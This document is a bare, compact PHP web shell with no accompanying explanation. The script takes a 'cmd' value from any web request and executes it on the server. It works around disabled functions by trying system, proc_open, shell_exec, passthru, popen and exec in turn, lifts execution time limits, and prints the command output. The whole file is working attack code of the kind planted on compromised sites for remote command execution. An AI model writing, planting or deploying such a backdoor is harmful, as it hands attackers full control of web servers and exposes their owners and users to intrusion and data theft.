<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>